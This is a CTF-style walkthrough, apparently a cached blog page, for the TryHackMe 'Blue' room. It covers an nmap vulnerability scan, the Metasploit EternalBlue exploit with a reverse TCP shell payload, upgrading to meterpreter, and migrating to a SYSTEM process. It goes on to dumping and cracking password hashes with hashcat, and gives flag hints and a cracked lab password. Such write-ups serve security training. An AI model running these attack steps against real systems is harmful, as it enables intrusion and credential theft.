@@ -1,0 +1,82 @@
+I"5<p class="label">Windows</p>
+
+<p class="label label-blue">EternalBlue</p>
+<p>Room: <a href="https://tryhackme.com/room/blue">tryhackme.com/room/blue</a></p>
+
+<h2 id="reconnaissance">Reconnaissance</h2>
+<p>First we need to do Reconnaissance.
+Just another port scanning :D</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nmap <span class="nt">-sV</span> <span class="nt">-vv</span> <span class="nt">--script</span> vuln TARGET-IP
+</code></pre></div></div>
+
+<h3 id="task-1---question">Task 1 - Question</h3>
+<p>Port under 1000?
+<img src="/images/blue01.jpg" alt="nmap-port" /></p>
+
+<p>What is this machine vulnerable to?
+<img src="/images/blue02.jpg" alt="nmap-vuln" /></p>
+
+<hr />
+<h2 id="gain-access">Gain Access</h2>
+<ol>
+  <li>Start metasploit</li>
+  <li>Search an exploit for <strong>(ms170-010)</strong></li>
+  <li>Use the exploit
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf&gt; exploit/windows/smb/ms17_010_eternalblue
+</code></pre></div>    </div>
+  </li>
+  <li>Set <strong>RHOSTS</strong> value</li>
+  <li>Set payload
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">set </span>payload windows/x64/shell/reverse_tcp
+</code></pre></div>    </div>
+  </li>
+  <li>Run the exploit &amp; pray :D</li>
+  <li>If succeed. Background this shell <strong>(CTRL+Z)</strong> 
+<img src="/images/blue03.jpg" alt="blue-session" /></li>
+</ol>
+
+<hr />
+<h2 id="escalate">Escalate</h2>
+<p>Escalate privileges &amp; upgrade shells in metasploit.</p>
+<ol>
+  <li>Search <strong>shell_to_meterpreter</strong> - Result: <strong>post/multi/manage/shell_to_meterpreter</strong></li>
+  <li>Use it :D</li>
+  <li>set session &amp; run (be patient &amp; wait)
+<br />(NOTE: If you dont know how, go back &amp; learn to use metasploit :D)
+<img src="/images/blue04.jpg" alt="blue-meterpreter" /></li>
+  <li>List all of the processes running via thex ‘ps’ command. Just because we are system doesn’t mean our process is. Find a process towards the bottom of this list that is running at NT AUTHORITY\SYSTEM and write down the process id (far left column).
+<img src="/images/blue05.jpg" alt="blue-ps" /></li>
+  <li>Migrate to this process using the ‘migrate PROCESS_ID’ command where the process id is the one you just wrote down in the previous step.
+<img src="/images/blue06.jpg" alt="blue-migrate" /></li>
+</ol>
+
+<hr />
+<h2 id="cracking">Cracking</h2>
+<p>Dump the non-default user’s password and crack it!</p>
+
+<ol>
+  <li>Within our elevated meterpreter shell, dump all of the passwords. 
+<img src="/images/blue07.jpg" alt="blue-dump" /></li>
+  <li>Copy the password hash &amp; crack it.
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>hashcat <span class="nt">-a</span> 0 <span class="nt">-m</span> 1000 crack.txt /usr/share/wordlists/rockyou.txt
+</code></pre></div>    </div>
+    <p>Result: <strong>Jon:alqfna22</strong></p>
+  </li>
+</ol>
+
+<hr />
+<h2 id="find-flags">Find flags!</h2>
+<h3 id="flag-1">Flag 1</h3>
+<p>Hint: Can you “C” it? So flag1 is located on C:\</p>
+
+<h3 id="flag-2">Flag 2</h3>
+<p>Hint: I wish I wrote down where I kept my password. Luckily it’s still stored here on Windows.
+“On Windows” maybe is on \Windows\ ? :V</p>
+
+<h3 id="flag-3">Flag 3</h3>
+<p>This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved.</p>
+
+<p>Maybe is located on \User\Documents\ ?</p>
+
+:ET
